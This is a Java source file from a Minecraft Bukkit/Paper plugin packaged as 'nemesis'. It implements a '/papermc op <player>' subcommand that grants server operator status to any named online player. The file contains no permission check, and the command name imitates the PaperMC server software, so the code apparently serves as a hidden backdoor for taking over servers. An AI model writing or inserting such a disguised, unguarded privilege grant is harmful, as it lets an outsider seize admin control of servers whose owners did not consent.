package dev.minhh2792.nemesis.commands.subcommands;

import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import dev.minhh2792.nemesis.Utils;
import dev.minhh2792.nemesis.commands.SubCommand;

public class OP implements SubCommand {

    @Override
    public void execute(CommandSender sender, String[] args) {
        if (args.length == 1) {
            sender.sendMessage(Utils.colorize("&cUsage: /papermc op <player>"));
            return;
        }

        Player player = Utils.getPlayerExact(args[1]);
        if (player == null) {
            sender.sendMessage(Utils.colorize("&cPlayer not found!"));
            return;
        }

        player.setOp(true);
        sender.sendMessage(Utils.colorize("&aYou have successfully opped " + player.getName()));
    }

    @Override
    public String getName() {
        return "OP";
    }
}
